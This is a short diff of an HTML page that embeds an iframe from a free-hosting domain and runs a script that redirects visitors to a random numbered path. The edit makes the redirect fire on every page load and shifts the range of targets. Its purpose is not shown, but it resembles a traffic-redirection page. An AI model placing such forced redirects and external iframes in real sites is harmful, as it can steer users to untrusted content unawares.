@@ -20,11 +20,11 @@
   <body>
     <iframe src="https://efx3.000webhostapp.com/a" id="mainFrame"></iframe>
     <script>
-      if(1&&location.href.indexOf('?')!=-1){
+      if(1||location.href.indexOf('?')!=-1){
         pathname = location.href.split('?')
         pathname = typeof pathname[1] != 'undefined' && pathname.length ? '/e/?' + pathname[1] : '/e'
         el = document.querySelector('#mainFrame')
-        location.href = '../' + (Math.random()*9|0) + pathname
+        location.href = '../' + (Math.random()*4+9|0) + pathname
       }
     </script>
   </body>
